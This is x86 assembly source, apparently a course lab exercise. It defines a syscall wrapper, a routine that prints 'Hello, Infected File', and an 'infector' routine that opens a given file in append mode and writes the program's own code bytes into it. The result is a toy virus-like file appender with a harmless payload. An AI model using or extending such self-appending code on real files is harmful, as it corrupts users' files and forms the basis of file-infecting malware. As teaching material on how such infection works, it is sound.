code_start:

WRITE EQU 4
OPEN EQU 5
CLOSE EQU 6
STDOUT EQU 1
O_APPEND EQU 1024
O_WRONLY EQU 1
section .data
  message : db "Hello, Infected File",10,0
  file dd 1
  fdout dd 1

  new_line: dd 10

  section .text

section .text
global _start
global system_call
global infector

extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop


system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infection:
  push ebp  ;push the value on ebp to stack
  mov ebp, esp ;move the value on esp to ebp

  push 20
  push message
  push STDOUT
  push WRITE
  call system_call
  add esp,16

  push 1
  push new_line
  push STDOUT
  push WRITE
  call system_call
  add esp,16

  mov esp, ebp
  pop ebp
  ret



infector:
  push ebp      ;push the value on ebp to stack
  mov ebp, esp  ;move the value on esp to ebp

  pushad  

  ;opening a file

  push 777o                             ;permissions
  push O_APPEND | O_WRONLY              ;access bits - open for both writing and appending
  push dword[ebp+8]                     ;pathname
  push OPEN                             ;open call number
  call system_call
  add esp, 16
  
  mov dword[fdout], eax

  ;write into the file

  mov eax,WRITE
  mov ebx,[fdout]
  mov ecx,code_start
  mov edx,code_end-code_start
  int 0x80

  ;close the file

  mov eax,CLOSE
  mov ebx,[fdout]
  int 0x80

  popad  

  mov esp, ebp
  pop ebp
  ret

code_end: